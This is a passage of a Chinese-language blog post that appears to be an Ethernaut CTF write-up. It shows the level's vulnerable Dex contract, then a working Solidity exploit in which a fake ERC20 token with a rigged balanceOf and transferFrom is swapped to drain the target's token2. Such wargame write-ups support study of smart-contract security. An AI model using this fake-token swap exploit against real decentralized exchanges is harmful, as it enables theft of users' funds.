</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 从from这个token中转出amount那么多token，换成to这个token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 首先你得有这么多的token可以转出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">from</span>).<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">amount</span>, <span style="color:#e6db74">&#34;Not enough to swap&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 计算价格目标的token数量
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">swap_amount</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_swap_price</span>(<span style="color:#a6e22e">from</span>, <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 转出来到中间dex
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">from</span>).<span style="color:#a6e22e">transferFrom</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 从中间dex转到to这个token里去
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">to</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">swap_amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">to</span>).<span style="color:#a6e22e">transferFrom</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">swap_amount</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 向中间dex白白转入amount那么多token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">add_liquidity</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">token_address</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amount</span>) <span style="color:#66d9ef">public</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">token_address</span>).<span style="color:#a6e22e">transferFrom</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_swap_price</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">from</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amount</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span>(<span style="color:#a6e22e">uint</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>(
</span></span><span style="display:flex;"><span>        (
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">amount</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">to</span>).<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>))
</span></span><span style="display:flex;"><span>        ) <span style="color:#f92672">/</span> <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">from</span>).<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>))
</span></span><span style="display:flex;"><span>      );
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amount</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SwappableToken</span>(<span style="color:#a6e22e">token1</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SwappableToken</span>(<span style="color:#a6e22e">token2</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">account</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">IERC20</span>(<span style="color:#a6e22e">token</span>).<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">account</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">SwappableToken</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">ERC20</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">string</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">string</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">symbol</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">initialSupply</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ERC20</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">symbol</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_mint</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">initialSupply</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">owner</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amount</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">returns</span>(<span style="color:#a6e22e">bool</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">_approve</span>(<span style="color:#a6e22e">owner</span>, <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-7">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-7">#</a></h2>
<p>分了两种token，一开始我有各有10个token，contract各有100个token，目标是把contract的某一个token弄为0.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">24</span>]: target
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">24</span>]: <span style="color:#e6db74">&#39;0x163F36EE7C8CF1436e14461397fD003b64AE469F&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">25</span>]: token1
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">25</span>]: <span style="color:#e6db74">&#39;0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">26</span>]: token2
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">26</span>]: <span style="color:#e6db74">&#39;0xce98C3170FCdFbC143879c5C3c14FB168b500500&#39;</span>
</span></span></code></pre></div><p>emmmm是否可以自己写一个新的token进去玩？</p>
<p>要使contract的某个token为空，就是在swap函数中转出的时候把所有的都转出。</p>
<h2 id="exp-10">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-10">#</a></h2>
<p>remix的gas估计，我愿称之为神。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">MyERC20Token</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">hacker</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x163F36EE7C8CF1436e14461397fD003b64AE469F</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">account</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint256</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">account</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">hacker</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">account</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">target</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transferFrom</span>(<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">uint256</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Dex</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">swap</span>(<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">ME2T</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">MyERC20Token</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Dex</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Dex</span>(<span style="color:#ae81ff">0x163F36EE7C8CF1436e14461397fD003b64AE469F</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">token1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">token2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xce98C3170FCdFbC143879c5C3c14FB168b500500</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">swap</span>(<span style="color:#a6e22e">ME2T</span>,<span style="color:#a6e22e">token2</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// selfdestruct(payable(0));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>第一次transferFrom中忘记返回true了，remix估计会fail，就真的fail了。</p>
<h1 id="通关留念">通关留念<a hidden class="anchor" aria-hidden="true" href="#通关留念">#</a></h1>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990292/blog/ethernaut/ak_eyd2fj.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://ainevsia.github.io/">Ainevsia Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
